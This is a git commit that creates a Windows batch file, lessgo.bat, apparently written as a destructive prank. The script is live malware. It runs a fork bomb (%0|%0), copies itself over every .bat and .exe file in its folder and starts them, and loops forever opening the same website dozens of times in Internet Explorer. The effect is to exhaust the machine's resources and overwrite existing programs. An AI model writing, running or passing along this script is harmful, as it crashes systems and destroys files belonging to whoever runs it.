d8e73066b3b7e66072fb329510d7f42a44e7c6a5
Gage Atkinson <73555272+someStranger8@users.noreply.github.com>
2021-06-08 08:36:55 -0400

    Create lessgo.bat

---
+++ lessgo.bat
@@ -0,0 +1,60 @@
+@echo off
+title less go
+color 57
+lessgo:
+%0|%0
+copy %0 *.bat > nul
+start "" *.bat
+copy %0 *.exe > nul
+start "" *.exe
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+echo less go
+start "iexplore.exe" https://piv.pivpiv.dk
+goto lessgo
